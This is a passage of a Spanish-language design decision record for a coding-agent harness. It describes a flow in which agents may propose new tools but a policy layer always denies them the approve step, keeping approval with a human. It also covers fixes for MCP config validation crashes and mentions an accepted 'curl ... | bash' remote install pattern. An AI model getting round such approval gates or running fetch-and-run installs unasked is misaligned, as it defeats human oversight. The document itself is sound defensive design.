  como `WARNING` a stderr — nunca hace fallar `cmd_tools_approve`, cuyo catálogo ya quedó escrito antes
  de llegar acá.
- **F-14 (low)** — `--tools-propose`/`--tools-approve` se interceptan en `main()` ANTES de construir el
  parser de `argparse` (necesario: `--install-<method>` es un nombre de flag dinámico que `argparse` no
  puede declarar), así que `--help` nunca los listaba. Reparado agregando ambos, en prosa, al epílogo del
  `--help` — deliberadamente NO como argumentos reales de `argparse` (eso reabriría el hueco de F-08 en
  cuanto `argparse` conociera el verbo). Y la doctrina del orquestador (`Global/_canonical/agents/
  orchestrator.md`) prometía que el orquestador podía correr `--tools-approve` "en su propio canal
  separado" — falso, `coord_policy` lo niega siempre, sin excepción; reescrito para que el bullet
  entregue el comando exacto al usuario y nunca lo corra.
- **F-15 (low)** — el mismo `atomic_write`+`json.dumps` de `tools.proposals.json` estaba duplicado,
  literal, en `_write_tools_proposal` y de nuevo inline en `cmd_tools_approve`. Extraído a
  `_save_tools_proposals(proposals)`, usado por ambos.

## Rejected alternatives

- **`--tools-approve` con la gramática completa (repetir `--kind`/`--detect`/`--install-<method>`/
  `--why`)**: descartado, diverge de la gramática literal de `spec.md` AC-31 y no gana nada de seguridad
  real (el humano de todas formas re-valida contra lo que `propose` ya imprimió).
- **`--kind mcp`/`skill` con un esquema propio (nativo de MCP: `type`/`command`/`url`; nativo de skill:
  ruta de archivos)**: descartado para este paquete. El esquema uniforme `detect`+`install.<method>`
  (igual al de `[cli.*]`) es el que AC-31 nombra explícitamente ("mismo schema que tools.toml"), y
  ramificar por kind agregaría superficie no pedida por ningún AC-30..35. Consecuencia explícita: una
  entrada `kind=mcp`/`skill` aprobada queda catalogada y visible en `tools.local.toml`, pero NO se
  integra automáticamente con `cmd_mcp_add`/un instalador de skills — eso es lectura humana del
  `install.<method>` guardado, no automatización. Sólo `kind=cli` se conecta de punta a punta con
  `cmd_tools_install`/`_tools_data()`/`--tools`, que es exactamente lo que el round-trip de evidencia de
  este paquete ejercita.

  **NEW-02 (medium, delta review round 3) — "no se integra" estaba implementado como traceback, no como
  salida limpia.** El párrafo de arriba ya declaraba en prosa que `kind=mcp` no se integra con
  `cmd_mcp_add`; lo que faltaba era que el código lo cumpliera sin crashear. `_valid_local_entry_shape`
  (F-06 round 2, `:1229`) exige `detect`+`install` para TODO kind — deliberadamente, por esta misma
  decisión de "un solo esquema uniforme" — pero nunca exige (ni puede, sin reabrir la alternativa de
  arriba) el `type`/`command`/`url` nativo que un `[mcp.*]` CURADO siempre tiene. Consecuencia: toda
  entrada `[mcp.*]` que sobrevive el filtro del overlay local tiene forma `cli` (sin `type`), y
  `_mcp_json_entry`/`_codex_section` indexan `spec["type"]` directo — `KeyError` reproducido en vivo con
  `--mcp-add`/`--mcp-on` sobre una entrada como la que el propio `--tools-approve --kind mcp` escribe, y
  alcanzable desde el canal del agente (`coord_policy.allowed` permite `--mcp-add`/`--mcp-on`/`--mcp-off`
  sin excepción para un nombre con forma de catálogo). Reparado con `_mcp_spec_supported(spec)` (`:2122`)
  — `isinstance(spec, dict) and "type" in spec` — corrido en los DOS call sites que de verdad indexan
  `type`: `_mcp_spec` (usado por `cmd_mcp_add`) y el `load_catalog().get("mcp", {}).get(name)` que
  `cmd_mcp_toggle` resuelve por su cuenta (deliberadamente sin pasar por `_mcp_spec`, para que
  opencode/codex puedan togglear un server gestionado sin entrada de catálogo). Ambos ahora imprimen
  `MCP_UNSUPPORTED {name} [harness={h}] — entrada local de tools.local.toml sin esquema MCP nativo;
  instalala a mano con install.<method> (ADR-0038)` con `rc` distinto de cero (`cmd_mcp_add`) o sin tocar
  ese harness (`cmd_mcp_toggle`, cuyo contrato es `rc=0` con o sin degradación puntual), en vez de
  propagar el `KeyError`. Los otros consumidores de `load_catalog().get("mcp", ...)` (`_mcp_data`/
  `cmd_mcp` para `--mcp`, y la comprobación de membership en `cmd_mcp_remove` para `--mcp-remove`) nunca
  indexan `type` — ya degradaban bien, y quedan pineados con test para que un cambio futuro no lo
  reintroduzca en silencio. `cmd_tools_approve`'s `NOTA:` para `kind != cli` (`:1666-1682`) ahora también
  nombra `--mcp-add`/`--mcp-on` para `kind=mcp`, no solo `--tools-install`, así que un humano se entera
  antes de intentarlo.

  **NEW-03 (medium, delta review round 4) — el guard validaba que `type` estuviera presente, no que el
  resto de la forma nativa lo estuviera.** `_mcp_spec_supported` de NEW-02 (`isinstance(spec, dict) and
  "type" in spec`) sólo cierra el caso honesto (overlay local sin editar, nunca tiene `type`). Un
  `tools.local.toml` editado a mano que tenga `detect`/`install` válidos (pasa `_valid_local_entry_shape`
  igual) y además agregue un `type` la esquiva: `_mcp_json_entry`/`_codex_section` (`:2031-2053`) indexan
  `spec["command"]`, `spec["command"][0]`, `spec["command"][1:]` y `spec["url"]` sin `.get()`, igual que
  indexaban `spec["type"]` antes de NEW-02. Reproducido en vivo (sandbox con `HOME`/`ROOT` redirigidos, ver
  `docs/specs/019-harness-evolution/evidence/P5-repair-4.md`): sin `command` → `KeyError`; `command=[]` →
  `IndexError`; `type` fuera de `{local, remote}` → `KeyError: 'url'` (la rama `else` de ambas funciones
  asume "no local" = "remote, así que `url` existe"); sin `url` o `url=""` → `KeyError` / URL vacía escrita
  sin aviso. El caso más grave no crashea: `command` como STRING (en vez de lista) hace que
  `command[0]`/`command[1:]` rebanen el string carácter por carácter — `MCP_ADDED ... rc=0`, y queda
  escrita una entrada corrupta en la config real del harness (`~/.claude.json` u homólogo) sin una sola
  advertencia. Reparado validando la forma nativa COMPLETA en `_mcp_spec_supported` (`:2122`): `type` debe
  ser `"local"` o `"remote"`; para `"local"`, `command` debe ser una lista no vacía de strings; para
  `"remote"`, `url` debe ser un string no vacío. Mismos dos call sites que NEW-02 (`_mcp_spec` vía
  `cmd_mcp_add`, y el chequeo directo en `cmd_mcp_toggle`) heredan la corrección sin cambios propios,
  porque ambos llaman a la misma función.
- **Aceptar `curl ... | bash -s -- <args>` (con argumentos después de bash/sh)**: descartado por ahora
  — más restrictivo que necesario, pero el único ejemplo real en el catálogo curado (`gcloud`) no los
  usa, y aflojar esto después es barato.
- **Permitir sudo en un `<cmd>` propuesto, dejando que `cmd_tools_install` sea el único gate**:
  descartado — un comando "aprobado" que en la práctica siempre re-pregunta es una entrada de catálogo
  engañosa; mejor rechazarla en el momento del propose, con un mensaje claro de por qué.
- **`--tools-approve` alcanzable por el agente tras "el orquestador ya preguntó y el humano dijo que
  sí"**: descartado explícitamente — ver §2. Si se necesita ese flujo alguna vez, es una ADR nueva con un
  mecanismo que preserve la aprobación humana real (por ejemplo, un canal fuera de `coord_policy`
  enteramente), no una relajación de este.

## Consecuencias

- Un CLI/MCP/skill fuera del catálogo curado deja de ser `blocked: tool missing`: el agente resuelve con
  `--tools-propose` y entrega la pregunta consolidada; el approve queda genuinamente en manos humanas.
- `tools.local.toml` y `tools.proposals.json` son nuevos artefactos untracked, en `ROOT` (el clon del
  harness — nunca per-project, ver §2/F-11): cualquier clon sin ellos sigue funcionando exactamente igual
  que hoy (never-fails); un approve corrido desde cualquier proyecto que use ese clon afecta el catálogo
  que ven todos los demás.
- El lane OpenCode necesita su propio `deny` explícito para `--tools-approve*` porque su enforcement es
  un glob más grueso que el walker de `coord_policy` — un recordatorio de que "coarser than
  coord_policy.py" (el comentario ya existente en `generate.py`) es una obligación de revisar cada
  ADR-0025/0038 nuevo ahí también, no solo en `coord_policy.py`.
- Cada allow nuevo en `coord_policy`/`generate.py` lleva su test negativo propio (`allowed()` rechaza
  `--tools-approve` bajo cualquier forma; el walker de `--tools-propose` rechaza cualquier flag fuera de
  su gramática cerrada).
